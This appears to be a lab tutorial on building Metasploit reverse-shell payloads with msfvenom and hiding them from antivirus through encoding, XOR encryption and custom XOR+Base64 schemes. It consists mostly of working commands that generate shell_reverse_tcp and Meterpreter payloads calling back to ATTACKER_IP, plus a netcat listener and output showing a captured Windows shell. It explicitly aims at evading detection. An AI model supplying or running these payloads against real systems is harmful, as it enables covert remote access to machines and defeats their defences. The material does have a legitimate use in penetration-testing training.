# Encode and Encrypt Shellcode with MSFVenom

Public tools like Metasploit provide encoding and encryption features for payloads. However, AV vendors are aware of these techniques and often detect payloads generated with default options. This section demonstrates encoding and encrypting shellcode using MSFVenom, and introduces custom encoding to bypass AV detection.

---

## Listing Encoders in Metasploit

You can list all available encoders with:

```bash
msfvenom --list encoders | grep excellent
```

Example output:

```
cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

---

## Encoding with `shikata_ga_nai`

To encode a payload three times with the `shikata_ga_nai` encoder:

```bash
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

Sample output:

```
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

> **Note:** Even with encoding, AVs like Windows Defender will likely detect the payload.

---

## Encryption with MSFVenom

List available encryption algorithms:

```bash
msfvenom --list encrypt
```

Example output:

```
Framework Encryption Formats [--encrypt <value>]
================================================
Name
----
aes256
base64
rc4
xor
```

To generate an XOR-encrypted payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

Sample output:

```
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

> **Note:** Even encrypted payloads are often detected by AVs.

---

## Creating a Custom Encoded Payload

To bypass AV detection, use a custom encoding scheme. For example, XOR the shellcode with a custom key and then encode it with Base64.

### 1. Generate Shellcode in CSharp Format

```bash
msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

### 2. Encode the Shellcode

Create a C# encoder that XORs the shellcode and encodes it in Base64. Replace the `buf` variable with your shellcode.

**Compile and run the encoder:**

```cmd
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

---

### 3. Create a Self-Decoding Payload

Modify your payload to decode the Base64 string and XOR it with the same key before execution.

**Compile the payload:**

```cmd
C:\> csc.exe EncStageless.cs
```

---

### 4. Test the Payload

Set up a Netcat listener:

```bash
nc -lvp 443
```

After executing the payload on the target, you should receive a shell:

```
Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
...
C:\Windows\System32>
```

---

## Conclusion

Default encoding and encryption methods in MSFVenom are often detected by AVs. Custom encoding (e.g., XOR + Base64) can help bypass detection. Simple modifications and creativity are often enough to evade signature-based detection.
